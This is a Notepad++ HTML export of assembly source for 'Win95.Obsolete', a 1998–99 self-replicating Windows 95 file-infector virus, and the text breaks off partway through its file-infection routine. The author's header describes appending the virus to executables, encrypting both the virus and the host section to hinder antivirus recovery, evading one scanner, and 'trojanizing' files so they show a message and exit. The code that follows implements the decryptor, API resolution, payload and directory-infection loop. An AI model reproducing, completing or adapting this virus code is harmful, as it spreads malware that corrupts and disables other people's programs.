<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     NAME: Win95.Obsolete v1.00</span><span class="sc0">
</span><span class="sc1">;     TYPE: Direct-action variable encrypting PE-infector.</span><span class="sc0">
</span><span class="sc1">;       OS: Windoze95 (my version that is).</span><span class="sc0">
</span><span class="sc1">;     SIZE: 1400-sumptin' bytes (yuck!).</span><span class="sc0">
</span><span class="sc1">;   AUTHOR: T-2000 / [Immortal Riot].</span><span class="sc0">
</span><span class="sc1">;   E-MAIL: T2000_@hotmail.com</span><span class="sc0">
</span><span class="sc1">;     DATE: December 1998 - February 1999.</span><span class="sc0">
</span><span class="sc1">;  PAYLOAD: Trojanizes files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Driven by the painful thought that my virii would never make the rounds</span><span class="sc0">
</span><span class="sc1">; again, I had to abandon my soulmate DOS and start writing for the Win32-</span><span class="sc0">
</span><span class="sc1">; beast... may the Incubus get me...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Obsolete is a 32-bit virus specifically written for Windoze95, however,</span><span class="sc0">
</span><span class="sc1">; it may or may not work correctly under other Win95-releases than mine,</span><span class="sc0">
</span><span class="sc1">; this due the fact that it uses two static API's (namely GetModuleHandleA</span><span class="sc0">
</span><span class="sc1">; and GetProcAddressA). When an infected file is executed the virus will</span><span class="sc0">
</span><span class="sc1">; try to infect up to three PE EXE/SCR files in the Windoze, System, and</span><span class="sc0">
</span><span class="sc1">; current directory. Files starting with the DWORD 'SCAN' will be excluded</span><span class="sc0">
</span><span class="sc1">; from infection, I assume McFuck's Win95-SCAN does a sanity-check, though</span><span class="sc0">
</span><span class="sc1">; I haven't verified this. Filedates/times will be preserved during the</span><span class="sc0">
</span><span class="sc1">; infection-process, and the virus won't be bothered by readonly-attributes.</span><span class="sc0">
</span><span class="sc1">; Obsolete doesn't fix a PE's alignments, Win95 doesn't give a fuck while</span><span class="sc0">
</span><span class="sc1">; WinNT does. Infection is achieved by adding the virusbody to the end of</span><span class="sc0">
</span><span class="sc1">; the victim's last section and pointing Entrypoint_RVA to this position.</span><span class="sc0">
</span><span class="sc1">; PE's are physically cut-off after the virusbody, this means that infected</span><span class="sc0">
</span><span class="sc1">; files can both grow or shrink in size. To make this heap of API's a bit</span><span class="sc0">
</span><span class="sc1">; less trivial I made it variable encrypt the last section of the host-file,</span><span class="sc0">
</span><span class="sc1">; it should harden-up recovery for the AV-pigs. Besides the virus itself is</span><span class="sc0">
</span><span class="sc1">; also variable encrypted with a seperate key. The payload is rather "harm-</span><span class="sc0">
</span><span class="sc1">; less" from my point of view, every now &amp; then it trojanizes the file it is</span><span class="sc0">
</span><span class="sc1">; infecting, trojanized files will generate a soundblaster beep, display an</span><span class="sc0">
</span><span class="sc1">; OK-box with a message, and then exit the current process, they won't pass</span><span class="sc0">
</span><span class="sc1">; control back to their host anymore, but are still cleanable.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now why is it that almost everybody is infecting PE's by adding to the</span><span class="sc0">
</span><span class="sc1">; last section? (being called the "29A-technique" by a certain group of</span><span class="sc0">
</span><span class="sc1">; braggers). For instance, you are changing the section's flags, in Windoze</span><span class="sc0">
</span><span class="sc1">; you should always stay the fuck off things that ain't yours. Furthermore,</span><span class="sc0">
</span><span class="sc1">; when you overwrite the (supposed to be) zero padding-bytes with your virus,</span><span class="sc0">
</span><span class="sc1">; you might just as well overwrite overlay-data, and what if you decide to</span><span class="sc0">
</span><span class="sc1">; stay resident in the "stolen" section? it is very likely that the section's</span><span class="sc0">
</span><span class="sc1">; virtualsize will overlap with your virus, and thus crash the system.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; CREDITS:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thanks to Lord Julus for writing that PE-infection guide which showed me</span><span class="sc0">
</span><span class="sc1">; the basics of Win32-programming, further more JFK's One was of much help</span><span class="sc0">
</span><span class="sc1">; as it was well commented, yet not too complicated. Biggest thanks go to</span><span class="sc0">
</span><span class="sc1">; Virogen and Murkry for teaching me the steps of how to infect a PE-file.</span><span class="sc0">
</span><span class="sc1">; Unfortunately Johnny Panic's info was a bit too advanched for me to</span><span class="sc0">
</span><span class="sc1">; understand as for now, and TechnoDrunk's advice was as usual hidden</span><span class="sc0">
</span><span class="sc1">; between a large amount of polymorphic junk-comments. Much information was</span><span class="sc0">
</span><span class="sc1">; gathered from the excellent PE-essays written by Micheal J. O'Leary and</span><span class="sc0">
</span><span class="sc1">; B. Luevelsmeyer (though the last one mentioned contained some errors).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As this is my 1st Win32-virus, errors are very likely to exist in this</span><span class="sc0">
</span><span class="sc1">; source, if you do find any of them, and/or have any advice for me regarding</span><span class="sc0">
</span><span class="sc1">; Win32-coding, please do inform me about it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   P.S. First generations will crash on exit.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; P.P.S. How the fuck do I smash sectors in Win32 ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">


                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc2">.386p</span><span class="sc0">
                </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">FLAT</span><span class="sc0">
                </span><span class="sc9">.DATA</span><span class="sc0">

                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Uch, without this the file will</span><span class="sc0">
                                        </span><span class="sc1">; crash, don't ask me why...</span><span class="sc0">


</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">CreateThreadA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">      </span><span class="sc1">; GetProcAddress seems to need these.</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0">           </span><span class="sc5">MessageBoxIndirectA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">


                </span><span class="sc9">.CODE</span><span class="sc0">

</span><span class="sc5">Off</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">On</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Debug_Mode</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc5">On</span><span class="sc0">                      </span><span class="sc1">; If switched on, only DUM*.*</span><span class="sc0">
                                                </span><span class="sc1">; will be infected.</span><span class="sc0">

</span><span class="sc5">Files_Per_Dir</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; 3 files per directory.</span><span class="sc0">
</span><span class="sc5">Marker_File</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc12">'T2IR'</span><span class="sc0">                  </span><span class="sc1">; Creeping through ur files.</span><span class="sc0">
</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; Physical virussize.</span><span class="sc0">
</span><span class="sc5">Virus_Size_Mem</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End_Mem</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; Virtual virussize.</span><span class="sc0">


</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHFD</span><span class="sc0">                          </span><span class="sc1">; Save flags &amp; registers.</span><span class="sc0">
                </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">               </span><span class="sc1">; Get our position in memory.</span><span class="sc0">
</span><span class="sc5">Get_Delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Get_Delta</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Load initial virus-key.</span><span class="sc0">
</span><span class="sc5">Initial_Key</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Encrypted</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Decrypt_Byte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Decrypt a byte.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">; Next one please.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; X-Ray, away.</span><span class="sc0">
</span><span class="sc5">Sliding_Key</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Decrypt_Byte</span><span class="sc0">            </span><span class="sc1">; And repeat the process.</span><span class="sc0">

</span><span class="sc5">Encrypted</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; All that comes after this is kept encrypted in PE's.</span><span class="sc0">

                </span><span class="sc1">; Get image-base, this method should also work</span><span class="sc0">
                </span><span class="sc1">; if the image is loaded at a different base</span><span class="sc0">
                </span><span class="sc1">; than the one specified in the PE-header.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">Virus_RVA</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Host_Image_Base</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Old_EIP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">KERNEL32_API</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">K32_API_Addresses</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Retrieve_API</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">JMP_Exec_Host</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Begin_Search</span><span class="sc0">
</span><span class="sc5">Payload_Switch</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Trojan</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">; Trojanized files will continue execution here.</span><span class="sc0">

                </span><span class="sc1">; Retrieve API-addresses in USER32.DLL.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">USER32_API</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Retrieve_API</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">JMP_Exec_Host</span><span class="sc0">

                </span><span class="sc1">; Generate a soundblaster-beep.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">MB_ICONEXCLAMATION</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">MessageBeep</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Display a box with a message.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">MB_ICONEXCLAMATION</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Window_Name</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Payload_Msg</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">MessageBoxA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Exit current process.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">ExitProcess</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">


</span><span class="sc5">Window_Name</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Win95.Obsolete v1.00'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Payload_Msg</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'MAN HAS BECOME OBSOLETE... FEAR THE MACHINES!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">JMP_Exec_Host</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Execute_Host</span><span class="sc0">


</span><span class="sc5">Begin_Search</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Current_Directory</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc1">; Save original path.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Obtain path to Windoze-directory.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Obtain path to Windoze\System-directory.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Infect files in Windoze-directory.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_Directory</span><span class="sc0">

                </span><span class="sc1">; Infect files in Windoze\System-directory.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_Directory</span><span class="sc0">

                </span><span class="sc1">; Infect files in the current directory.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_Directory</span><span class="sc0">

</span><span class="sc5">Execute_Host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Section_Size</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Virus_Exit</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">
</span><span class="sc5">Host_Image_Base</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Carrier</span><span class="sc0">
</span><span class="sc5">RVA_Encrypted</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_K_Section</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Decr_Section</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">; Decrypt the host's section.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Slide_K_Section</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Decr_Section</span><span class="sc0">

</span><span class="sc5">Virus_Exit</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">POPAD</span><span class="sc0">                           </span><span class="sc1">; Restore registers &amp; flags.</span><span class="sc0">
                </span><span class="sc6">POPFD</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Carrier</span><span class="sc0">     </span><span class="sc1">; EAX = EIP of program.</span><span class="sc0">
</span><span class="sc5">Old_EIP</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">



</span><span class="sc5">Infect_Directory</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc1">; Reset infection-counter.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Infect_Counter</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Search_Buffer</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">File_Spec</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">FindFirstFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; Abort on error.</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exit_Infect</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">Infect_Loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Infect_Counter</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc5">Files_Per_Dir</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Exit_Infect</span><span class="sc0">

</span><span class="sc5">Infect_File</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Search_Buffer.Find_File_Name</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Check_File_Ext</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Find end of ASCIIZ-string.</span><span class="sc0">
